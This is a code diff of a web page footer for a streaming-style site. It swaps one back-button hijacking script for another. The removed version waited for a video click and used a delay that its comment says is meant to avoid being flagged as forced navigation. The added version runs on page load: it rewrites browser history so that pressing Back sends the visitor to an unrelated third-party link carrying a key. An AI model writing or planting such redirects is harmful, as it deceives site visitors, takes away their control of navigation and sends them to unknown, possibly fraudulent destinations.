@@ -124,41 +124,13 @@
 
 </div><footer>© 2026 ViralStream Media. All rights reserved.</footer></div>
 
-<script type="text/javascript">
-document.addEventListener("DOMContentLoaded", function () {
-  const directLink = "https://petsrulefondness.com/dii28d7cuw?key=3b96fa2b939b689c32ab2e5d1fed2c3b";
-  const video = document.querySelector("video");
+<script>
+(function () {
+  const link = "https://braceslinear.com/d40w8mx5c?key=e15240371508f21838848c29a618630a";
 
-  if (!video || !directLink) return;
-
-  let armed = false;
-
-  function armBackRedirect() {
-    if (armed) return;
-    armed = true;
-
-    try {
-      history.pushState({ armed: true }, "", location.href);
-
-      window.addEventListener(
-        "popstate",
-        function () {
-          // delay kecil agar tidak dianggap forced navigation
-          setTimeout(function () {
-            window.location.href = directLink;
-          }, 100);
-        },
-        { once: true }
-      );
-    } catch (e) {
-      console.warn("History API blocked:", e);
-    }
-  }
-
-  // hanya user-initiated interaction
-  video.addEventListener("click", armBackRedirect, { once: true });
-  video.addEventListener("touchstart", armBackRedirect, { once: true });
-});
+  history.pushState(null, null, location.href);
+  window.onpopstate = () => location.replace(link);
+})();
 </script>
 
 	<!-- Histats.com  START  (aync)-->
